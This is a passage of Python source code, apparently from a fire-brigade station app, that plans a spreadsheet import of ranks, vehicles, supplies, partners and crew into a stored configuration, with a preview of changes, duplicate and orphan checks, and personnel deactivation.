    return list(((config.get(top) or {}).get(key)) or [])


def _stored_ranks(config: dict[str, Any]) -> list[dict[str, Any]]:
    return list(((config.get("roster") or {}).get("ranks")) or [])


def _partner_pairs(config: dict[str, Any]) -> list[tuple[str, str]]:
    """Every ``(kategorie, name)`` the six partner lists hold, in the sheet's own order."""
    report = list(((config.get("report") or {}).get("partnerOrgs")) or [])
    partner = ((config.get("fleet") or {}).get("partner")) or {}
    out: list[tuple[str, str]] = [("rapport", _text(n)) for n in report]
    for kat in PARTNER_LABELS:
        if kat == "rapport":
            continue
        out.extend((kat, _text(n)) for n in (partner.get(kat) or []))
    return out


# ── the plan ───────────────────────────────────────────────────────────────────────────


class SheetImpact(BaseModel):
    """What one sheet would do — the numbers the confirmation screen is built on.

    ``removal_kind`` exists because "absent" means two different things in one workbook, and
    the two need different German words. A person missing from ``Mannschaft`` is DEACTIVATED
    (soft — closed incidents resolve names through the row, so it is never deleted); a vehicle
    id missing from ``Fahrzeuge`` is REMOVED from the list. An operator who reads one and gets
    the other has been misled by the screen that was supposed to protect them.
    """

    sheet: str
    present: bool
    rows: int = 0
    created: int = 0
    updated: int = 0
    unchanged: int = 0
    #: the ids/names that go away, NAMED (capped at REMOVAL_LIMIT) — a count is not actionable
    removed: list[str] = []
    removed_total: int = 0
    removal_kind: Literal["removed", "deactivated", "none"] = "none"


class WorkbookPreview(BaseModel):
    """The whole confirmation screen's payload. Nothing is written to produce it."""

    sheets: list[SheetImpact]
    #: refused rows, each «{Blatt} Zeile {n} – {was ist falsch}». Non-empty → nothing may run.
    errors: list[str] = []
    #: things worth reading but not worth refusing (unknown tabs, duplicate names in the file)
    warnings: list[str] = []
    #: config sections that HAVE content today and would have none after — config_history's
    #: own `emptied_sections`, computed on the projected document. The shape of every one of
    #: this project's four config-clobbering incidents.
    emptied: list[str] = []
    #: sha256 of the uploaded bytes; the import echoes it back so the confirmation cannot
    #: apply a file other than the one that was previewed
    digest: str = ""
    #: nothing refused → the operator may confirm
    ok: bool = True


class WorkbookImportResult(BaseModel):
    sheets: list[SheetImpact]
    warnings: list[str] = []
    emptied: list[str] = []


@dataclass
class ImportPlan:
    """Everything the write needs, decided before a single row is touched.

    The preview and the write run this same planner over the same file, so the numbers the
    operator confirmed are the numbers that happen.
    """

    preview: WorkbookPreview
    #: the projected config document, already normalized through `load_stored_config`
    config: dict[str, Any]
    #: whether the config document changed at all (an unchanged one is not written)
    config_changed: bool
    roster: RosterPlan | None
    #: the Mannschaft rows the plan was built from, index-aligned with ``roster.targets`` —
    #: the write needs the ``Aktiv`` flag, which a RosterCsvRow has no room for
    mannschaft_rows: list[PersonRow] = field(default_factory=list)
    #: the roster lookup the plan resolved against; the write keeps adding to it as it attaches
    #: identities, so one file naming the same person twice cannot attach two
    roster_index: RosterIndex | None = None
    name_order: NameOrder = DEFAULT_NAME_ORDER
    #: parsed row index → the rank key to write (None = the row named none, leave as is)
    ranks_for_row: dict[int, str | None] = field(default_factory=dict)
    #: people to deactivate — absent from a present Mannschaft sheet, or marked «nein»
    deactivate: list[uuid.UUID] = field(default_factory=list)


def plan_import(
    parsed: ParsedWorkbook,
    stored: dict[str, Any] | None,
    people: list[RosterPerson],
    index: RosterIndex,
    identities: dict[uuid.UUID, tuple[str, str]],
    order: NameOrder = DEFAULT_NAME_ORDER,
    digest: str = "",
) -> ImportPlan:
    """Project the workbook onto the stored document and count what that would do.

    ⚠️ Only the key paths the workbook has sheets for are replaced (rule 1). Everything else —
    ``identity`` (assets included), ``map``, ``doctrine``, ``referenceLayers``, ``modules``,
    ``alarms``, ``alarmKeywords``, ``report.links``, ``journal``, ``mittel.units`` — is carried
    over from the stored document untouched, because it is read from the DATABASE and never
    from a client draft. That is also why this needs no ``If-Match``: there is no draft to be
    stale.
    """
    errors = list(parsed.errors)
    warnings = [f"Unbekanntes Blatt «{n}» – wird nicht eingelesen." for n in parsed.unknown_sheets]
    raw = dict(stored or {})
    # The stored document as the app actually reads it. Comparing a projection against the RAW
    # row would report a difference on every defaulted field the row happens not to carry.
    base = load_stored_config(raw).model_dump(mode="json")
    projected: dict[str, Any] = dict(base)
    impacts: list[SheetImpact] = []

    # ── Dienstgrade ────────────────────────────────────────────────────────────────────
    stored_ranks = _stored_ranks(base)
    if parsed.dienstgrade.present and parsed.dienstgrade.usable:
        new_ranks = [{"key": r.key, "label": r.label, "abbr": r.abbr, "tier": r.tier} for r in parsed.dienstgrade.rows]
        _refuse_duplicates([(r.line, r.key) for r in parsed.dienstgrade.rows], SHEET_DIENSTGRADE, "Schlüssel", errors)
        projected["roster"] = {**(projected.get("roster") or {}), "ranks": new_ranks}
        impacts.append(_impact(SHEET_DIENSTGRADE, stored_ranks, new_ranks, "key", "removed"))
    else:
        new_ranks = stored_ranks
        impacts.append(SheetImpact(sheet=SHEET_DIENSTGRADE, present=parsed.dienstgrade.present))
    rank_keys = {str(r.get("key")) for r in new_ranks}

    # ── Fahrzeuge ──────────────────────────────────────────────────────────────────────
    stored_vehicles = _section(base, "fleet", "vehicles")
    fleet = dict(projected.get("fleet") or {})
    if parsed.fahrzeuge.present and parsed.fahrzeuge.usable:
        # ⚠️ `winfapAlias` is carried over on an id match and never written from the sheet: it
        # has no editor anywhere in the app, so a workbook round trip is the only thing that
        # could silently drop it (rule 5).
        by_id = {str(v.get("id")): v for v in stored_vehicles}
        new_vehicles = [
            {"id": v.id, "label": v.label, "winfapAlias": (by_id.get(v.id) or {}).get("winfapAlias")}
            for v in parsed.fahrzeuge.rows
        ]
        _refuse_duplicates([(v.line, v.id) for v in parsed.fahrzeuge.rows], SHEET_FAHRZEUGE, "Kennung", errors)
        fleet["vehicles"] = new_vehicles
        impacts.append(_impact(SHEET_FAHRZEUGE, stored_vehicles, new_vehicles, "id", "removed"))
    else:
        impacts.append(SheetImpact(sheet=SHEET_FAHRZEUGE, present=parsed.fahrzeuge.present))

    # ── Mittel ─────────────────────────────────────────────────────────────────────────
    stored_mittel = _section(base, "mittel", "catalogue")
    mittel = dict(projected.get("mittel") or {})
    stored_by_id = {str(m.get("id")): m for m in stored_mittel}
    new_mittel: list[dict[str, Any]]
    if parsed.mittel.present and parsed.mittel.usable:
        # ⚠️ `when` is a RULE, not a value — `{"Typ": "Exhauster"}`, or a list of clauses meaning
        # OR. It has no spreadsheet shape at all, so it is carried over on an id match and never
        # constructed here (rule 5). `stock` is carried over too unless the Bestände sheet is
        # present and therefore says otherwise.
        new_mittel = [
            {
                "id": m.id,
                "label": m.label,
                "unit": m.unit,
                "category": m.category,
                "symbol": m.symbol,
                "verbrauchbar": m.verbrauchbar,
                "when": (stored_by_id.get(m.id) or {}).get("when"),
                "stock": list((stored_by_id.get(m.id) or {}).get("stock") or []),
            }
            for m in parsed.mittel.rows
        ]
        _refuse_duplicates([(m.line, m.id) for m in parsed.mittel.rows], SHEET_MITTEL, "Kennung", errors)
        # Compared WITHOUT `stock`: the Bestände sheet owns that, and a load-out change that
        # showed up as «geändert» on both sheets would double-count the same edit.
        mittel_impact = _impact(
            SHEET_MITTEL, [_no_stock(m) for m in stored_mittel], [_no_stock(m) for m in new_mittel], "id", "removed"
        )
    else:
        new_mittel = [dict(m) for m in stored_mittel]
        mittel_impact = SheetImpact(sheet=SHEET_MITTEL, present=parsed.mittel.present)

    # ── Quellen ────────────────────────────────────────────────────────────────────────
    stored_sources = _section(base, "mittel", "sources")
    if parsed.quellen.present and parsed.quellen.usable:
        new_sources = [{"id": s.id, "label": s.label} for s in parsed.quellen.rows]
        _refuse_duplicates([(s.line, s.id) for s in parsed.quellen.rows], SHEET_QUELLEN, "Kennung", errors)
        impacts.append(_impact(SHEET_QUELLEN, stored_sources, new_sources, "id", "removed"))
    else:
        new_sources = stored_sources
        impacts.append(SheetImpact(sheet=SHEET_QUELLEN, present=parsed.quellen.present))
    source_ids = {str(s.get("id")) for s in new_sources}
    mittel_ids = {str(m.get("id")) for m in new_mittel}

    # ── Mittel-Bestände — the one cross-sheet reference ────────────────────────────────
    if parsed.bestaende.present and parsed.bestaende.usable:
        stock: dict[str, list[dict[str, Any]]] = {}
        seen: dict[tuple[str, str], int] = {}
        for stock_row in parsed.bestaende.rows:
            if stock_row.mittel_id not in mittel_ids:
                errors.append(
                    located(
                        f"Mittel-Kennung {cell_text(stock_row.mittel_id)} gibt es nicht – weder im Blatt "
                        f"«{SHEET_MITTEL}» noch im Katalog der Station.",
                        sheet=SHEET_BESTAENDE,
                        row=stock_row.line,
                    )
                )
                continue
            if stock_row.source_id not in source_ids:
                errors.append(
                    located(
                        f"Quellen-Kennung {cell_text(stock_row.source_id)} gibt es nicht – weder im Blatt "
                        f"«{SHEET_QUELLEN}» noch in den Quellen der Station.",
                        sheet=SHEET_BESTAENDE,
                        row=stock_row.line,
                    )
                )
                continue
            pair = (stock_row.mittel_id, stock_row.source_id)
            if pair in seen:
                errors.append(
                    located(
                        f"{cell_text(stock_row.mittel_id)} bei {cell_text(stock_row.source_id)} steht schon in "
                        f"Zeile {seen[pair]} – jede Kombination darf nur einmal vorkommen.",
                        sheet=SHEET_BESTAENDE,
                        row=stock_row.line,
                    )
                )
                continue
            seen[pair] = stock_row.line
            stock.setdefault(stock_row.mittel_id, []).append({"source": stock_row.source_id, "qty": stock_row.qty})
        old_stock = [
            {"k": f"{item.get('id')} · {entry.get('source')}", "qty": entry.get("qty")}
            for item in stored_mittel
            for entry in (item.get("stock") or [])
        ]
        for target in new_mittel:
            target["stock"] = stock.get(str(target.get("id")), [])
        new_stock = [
            {"k": f"{fresh.get('id')} · {line.get('source')}", "qty": line.get("qty")}
            for fresh in new_mittel
            for line in (fresh.get("stock") or [])
        ]
        impacts.append(_impact(SHEET_BESTAENDE, old_stock, new_stock, "k", "removed", rows=len(parsed.bestaende.rows)))
    else:
        impacts.append(SheetImpact(sheet=SHEET_BESTAENDE, present=parsed.bestaende.present))

    # A source may only go away once nothing points at it any more. Checked against the
    # PROJECTED stock, so dropping a vehicle and its Bestände rows in one file is fine —
    # what is refused is leaving entries filed under a source that no longer exists.
    if parsed.quellen.present and parsed.quellen.usable:
        orphaned: dict[str, list[str]] = {}
        for holder in new_mittel:
            for held in holder.get("stock") or []:
                if str(held.get("source")) not in source_ids:
                    orphaned.setdefault(str(held.get("source")), []).append(str(holder.get("id")))
        for sid, users in orphaned.items():
            errors.append(
                located(
                    f"Die Quelle «{sid}» fehlt in der Datei, aber der Bestand von "
                    f"{_and_more(sorted(set(users)))} liegt dort. Quelle behalten oder die "
                    f"Bestände im Blatt «{SHEET_BESTAENDE}» umbuchen.",
                    sheet=SHEET_QUELLEN,
                )
            )

    impacts.append(mittel_impact)
    mittel["catalogue"] = new_mittel
    mittel["sources"] = new_sources
    projected["mittel"] = mittel

    # ── Partnerorganisationen ──────────────────────────────────────────────────────────
    if parsed.partner.present and parsed.partner.usable:
        buckets: dict[str, list[str]] = {k: [] for k in PARTNER_LABELS}
        seen_pairs: dict[tuple[str, str], int] = {}
        for partner_row in parsed.partner.rows:
            pair = (partner_row.kategorie, normalize_name(partner_row.name))
            if pair in seen_pairs:
                errors.append(
                    located(
                        f"{cell_text(partner_row.name)} steht unter "
                        f"«{PARTNER_LABELS[partner_row.kategorie]}» schon in Zeile {seen_pairs[pair]}.",
                        sheet=SHEET_PARTNER,
                        row=partner_row.line,
                    )
                )
                continue
            seen_pairs[pair] = partner_row.line
            buckets[partner_row.kategorie].append(partner_row.name)
        old_pairs = [f"{PARTNER_LABELS[k]} · {n}" for k, n in _partner_pairs(base)]
        new_pairs = [f"{PARTNER_LABELS[k]} · {n}" for k in PARTNER_LABELS for n in buckets[k]]
        projected["report"] = {**(projected.get("report") or {}), "partnerOrgs": buckets["rapport"]}
        fleet["partner"] = {
            **(fleet.get("partner") or {}),
            **{k: v for k, v in buckets.items() if k != "rapport"},
        }
        impacts.append(
            _impact(
                SHEET_PARTNER,
                [{"k": k} for k in old_pairs],
                [{"k": k} for k in new_pairs],
                "k",
                "removed",
                rows=len(parsed.partner.rows),
            )
        )
    else:
        impacts.append(SheetImpact(sheet=SHEET_PARTNER, present=parsed.partner.present))

    # ── Symbolfelder ───────────────────────────────────────────────────────────────────
    stored_lists = _section(base, "fleet", "attributeLists")
    if parsed.symbolfelder.present and parsed.symbolfelder.usable:
        grouped: dict[tuple[str, str], list[str]] = {}
        for option_row in parsed.symbolfelder.rows:
            grouped.setdefault((option_row.symbol, option_row.field), []).append(option_row.option)
        new_lists = [{"symbol": symbol, "field": fld, "options": options} for (symbol, fld), options in grouped.items()]
        fleet["attributeLists"] = new_lists
        impacts.append(
            _impact(
                SHEET_SYMBOLFELDER,
                [{"k": f"{a.get('symbol')} · {a.get('field')}", **a} for a in stored_lists],
                [{"k": f"{a['symbol']} · {a['field']}", **a} for a in new_lists],
                "k",
                "removed",
                rows=len(parsed.symbolfelder.rows),
            )
        )
    else:
        impacts.append(SheetImpact(sheet=SHEET_SYMBOLFELDER, present=parsed.symbolfelder.present))
    projected["fleet"] = fleet

    # ── Mannschaft ─────────────────────────────────────────────────────────────────────
    roster_plan, rank_for_row, deactivate, person_impact = _plan_people(
        parsed.mannschaft, people, index, identities, new_ranks, rank_keys, order, errors, warnings
    )
    impacts.append(person_impact)

    # A Dienstgrad may only go away once nobody carries it any more — checked against the
    # ranks people hold AFTER this workbook applies, so re-grading a person and dropping their
    # old rank in one file is fine.
    if parsed.dienstgrade.present and parsed.dienstgrade.usable:
        _refuse_orphaned_ranks(people, roster_plan, rank_for_row, rank_keys, deactivate, order, errors)

    # Normalized through `load_stored_config`, exactly like `adopt_ranks` does — never through
    # the strict PUT-body model. A field that has grown a validation rule since the row was
    # written (an old `accentColor`) must be dropped, not make an import 500 on a section it
    # never touched.
    try:
        normalized = load_stored_config(projected).model_dump(mode="json")
    except Exception:  # noqa: BLE001 — a refusal the operator can read beats a 500
        errors.append("Die Daten aus der Arbeitsmappe ergeben keine gültige Stations-Konfiguration.")
        normalized = base
    ordered = {i.sheet: i for i in impacts}
    preview = WorkbookPreview(
        sheets=[ordered[s] for s in SHEET_ORDER],
        errors=errors,
        warnings=warnings,
        # …on the document that would actually be STORED, not on the raw projection: the same
        # `emptied_sections` «Letzte Änderungen» reports after the fact (config_history), said
        # before the fact, which is the only time it can still be acted on.
        emptied=emptied_sections(base, normalized),
        digest=digest,
        ok=not errors,
    )
    return ImportPlan(
        preview=preview,
        config=normalized,
        config_changed=normalized != base,
        roster=roster_plan,
        mannschaft_rows=list(parsed.mannschaft.rows),
        roster_index=index,
        name_order=order,
        ranks_for_row=rank_for_row,
        deactivate=deactivate,
    )


def _and_more(names: list[str], limit: int = REMOVAL_LIMIT) -> str:
    if len(names) <= limit:
        return ", ".join(f"«{n}»" for n in names)
    rest = len(names) - limit
    return ", ".join(f"«{n}»" for n in names[:limit]) + f" und {rest} weitere"


def _refuse_duplicates(pairs: list[tuple[int, str]], sheet: str, column: str, errors: list[str]) -> None:
    """Two rows claiming the same key are two rows claiming to be the same thing. Refused
    rather than last-one-wins: silently keeping one of them is how a station ends up with a
    Dienstgrad nobody can reach and people pointing at it."""
    seen: dict[str, int] = {}
    for line, key in pairs:
        if key in seen:
            errors.append(
                located(f"{column} {cell_text(key)} steht schon in Zeile {seen[key]}.", sheet=sheet, row=line)
            )
        else:
            seen[key] = line


def _impact(
    sheet: str,
    old: list[dict[str, Any]],
    new: list[dict[str, Any]],
    key: str,
    removal_kind: Literal["removed", "deactivated"],
    rows: int | None = None,
) -> SheetImpact:
    """New / changed / unchanged / removed for one keyed list.

    "Changed" is a real comparison against the stored entry, not "matched an existing key" —
    a re-imported untouched export has to read «0 neu, 0 geändert», because that number is the
    only evidence the operator gets that the file did not quietly corrupt an id.
    """
    old_by = {str(o.get(key)): o for o in old}
    new_by = {str(n.get(key)): n for n in new}
    created = [k for k in new_by if k not in old_by]
    updated = [k for k in new_by if k in old_by and _comparable(new_by[k]) != _comparable(old_by[k])]
    removed = sorted(k for k in old_by if k not in new_by)
    return SheetImpact(
        sheet=sheet,
        present=True,
        rows=len(new) if rows is None else rows,
        created=len(created),
        updated=len(updated),
        unchanged=len(new_by) - len(created) - len(updated),
        removed=removed[:REMOVAL_LIMIT],
        removed_total=len(removed),
        removal_kind=removal_kind,
    )


def _no_stock(entry: dict[str, Any]) -> dict[str, Any]:
    """A catalogue entry without its load-out — the Bestände sheet owns ``stock``."""
    return {k: v for k, v in entry.items() if k != "stock"}


def _comparable(entry: dict[str, Any]) -> dict[str, Any]:
    """The entry without the synthetic join key the impact helper adds."""
    return {k: v for k, v in entry.items() if k != "k"}


def _plan_people(
    sheet: ParsedSheet[PersonRow],
    people: list[RosterPerson],
    index: RosterIndex,
    identities: dict[uuid.UUID, tuple[str, str]],
    ranks: list[dict[str, Any]],
    rank_keys: set[str],
    order: NameOrder,
    errors: list[str],
    warnings: list[str],
) -> tuple[RosterPlan | None, dict[int, str | None], list[uuid.UUID], SheetImpact]:
    """Resolve the Mannschaft sheet onto the roster.

    ⚠️ Row identity is NOT this module's invention: it is ``plan_roster_rows``
    (app/personnel), unchanged, the same planner the CSV import and its preview already run.
    Provider + external_id first, normalized name second — including both spelling orders for
    anyone whose name is stored split, so flipping ``roster.nameOrder`` between two imports
    does not produce a second Wehr. Its one known trade (two different people spelled the same
    collapse into one row) is inherited deliberately and named in the admin page's copy.
    """
    if not sheet.present or not sheet.usable:
        return None, {}, [], SheetImpact(sheet=SHEET_MANNSCHAFT, present=sheet.present)

    # The rank column is resolved against the ranks this workbook PROJECTS, not the stored
    # ones: adding a Dienstgrad on one tab and using it on another is the obvious thing to do
    # with a workbook, and refusing it would make the two sheets useless together.
    rank_for_row: dict[int, str | None] = {}
    for i, row in enumerate(sheet.rows):
        if not row.rank_text:
            rank_for_row[i] = None
            continue
        hit = match_rank(row.rank_text, ranks)
        if hit is None:
            errors.append(
                located(
                    f"Grad {cell_text(row.rank_text)} steht nicht im Blatt «{SHEET_DIENSTGRADE}» "
                    f"und die Station kennt ihn nicht. Erlaubt: {_and_more([str(r.get('label')) for r in ranks])}.",
                    sheet=SHEET_MANNSCHAFT,
                    row=row.line,
                )
            )
        elif hit not in rank_keys:  # defensive: match_rank ran over the same list
            errors.append(
                located(f"Grad {cell_text(row.rank_text)} ist unbekannt.", sheet=SHEET_MANNSCHAFT, row=row.line)
            )
        rank_for_row[i] = hit

    csv_rows = [
        RosterCsvRow(line=r.line, name=r.name, rank_text=r.rank_text, provider=r.provider, external_id=r.external_id)
        for r in sheet.rows
    ]
    plan = plan_roster_rows(csv_rows, index)
    for name in plan.duplicate_names:
        warnings.append(f"«{name}» steht mehrfach im Blatt «{SHEET_MANNSCHAFT}» – wird als eine Person importiert.")

    by_id = {p.id: p for p in people}
    touched = {t.person_id for t in plan.targets if t.person_id is not None}
    created = plan.creates
    updated = 0
    for i, target in enumerate(plan.targets):
        if target.person_id is None or target.owner != i:
            continue
        person = by_id.get(target.person_id)
        if person is None:
            continue
        row = sheet.rows[i]
        rank = rank_for_row.get(i)
        served = person_display_name(person, order)
        changed = (
            row.name != served
            or row.active != person.is_active
            or (rank is not None and rank != person.rank)
            or (bool(row.provider) and identities.get(person.id, ("", "")) != (row.provider, row.external_id))
        )
        if changed:
            updated += 1
        # ⚠️ Renaming somebody whose name is stored SPLIT costs them the split. The write has to
        # clear first/last — person_display_name rebuilds the served name from those two where
        # both are known, so keeping them would make the rename appear to do nothing — and from
        # then on that person no longer follows `roster.nameOrder`; their cell is served
        # verbatim. That is a behaviour an operator triggers from a spreadsheet cell and would
        # otherwise never discover, so it is said HERE, per person, on the screen they confirm
        # from. Only reported when the split actually exists: for hand-entered crew there is
        # nothing to lose and the line would be noise.
        #
        # Which rows can even BE a rename: only those matched on Quelle + Externe ID. Without an
        # identity the NAME is the key, so an edited name is a different person — a create plus
        # a deactivation, both of which the preview already counts by themselves.
        if row.name != served and (person.first_name or "").strip() and (person.last_name or "").strip():
            warnings.append(
                f"«{served}» wird zu «{row.name}» umbenannt. Die Aufteilung in Vor- und Nachname "
                "geht dabei verloren – diese Person folgt danach nicht mehr der Namensreihenfolge "
                "der Station, sondern steht genau so da wie in der Zelle."
            )

    # Two ways to end up inactive, one word for both: absent from a sheet that IS present, or
    # named with «Aktiv = nein». Never a delete — a person is referenced by every incident
    # they were on, so the row has to stay resolvable (api/personnel · deactivate_person).
    off_by_row = {
        target.person_id
        for i, target in enumerate(plan.targets)
        if target.person_id is not None and not sheet.rows[i].active
    }
    deactivate = [p.id for p in people if p.is_active and (p.id not in touched or p.id in off_by_row)]
    names = sorted(person_display_name(by_id[pid], order) for pid in deactivate if pid in by_id)
    impact = SheetImpact(
        sheet=SHEET_MANNSCHAFT,
        present=True,
        rows=len(sheet.rows),
        created=created,
        updated=updated,
        unchanged=plan.updates - updated,
        removed=names[:REMOVAL_LIMIT],
        removed_total=len(names),
        removal_kind="deactivated",
    )
    return plan, rank_for_row, deactivate, impact


def _refuse_orphaned_ranks(
    people: list[RosterPerson],
    plan: RosterPlan | None,
    rank_for_row: dict[int, str | None],
    rank_keys: set[str],
    deactivate: list[uuid.UUID],
    order: NameOrder,
    errors: list[str],
) -> None:
    """Refuse to drop a Dienstgrad that somebody would still be carrying afterwards.

    ⚠️ ``roster.ranks[].key`` is referenced by every person, and nothing enforces it in the
    schema. Dropping a rank without re-grading its people leaves them pointing at a key that
    resolves to nothing: the badge renders the raw slug, «nur Offiziere» loses them, and the
    Anwesenheit grouping puts them nowhere. Checked against the ranks people hold AFTER this
    workbook applies, so re-grading somebody and dropping their old rank in one file is fine —
    what is refused is the half of that edit that was forgotten. Inactive people count: they
    are still on closed incidents and still print on a Rapport.
    """
    after: dict[str, list[str]] = {}
    written: dict[uuid.UUID, str | None] = {}
    if plan is not None:
        for i, target in enumerate(plan.targets):
            if target.person_id is not None and target.owner == i and rank_for_row.get(i) is not None:
                written[target.person_id] = rank_for_row[i]
    for person in people:
        rank = written.get(person.id, person.rank)
        if rank and rank not in rank_keys:
            after.setdefault(rank, []).append(person_display_name(person, order))
    for key, names in sorted(after.items()):
        errors.append(
            located(
                f"Der Grad «{key}» fehlt in der Datei, aber {len(names)} "
                f"{'Person trägt' if len(names) == 1 else 'Personen tragen'} ihn noch: "
                f"{_and_more(sorted(names))}. Grad behalten oder diese Leute im Blatt "
                f"«{SHEET_MANNSCHAFT}» umgraden.",
                sheet=SHEET_DIENSTGRADE,
            )
        )
    _ = deactivate  # deactivated people keep their Dienstgrad and are counted above
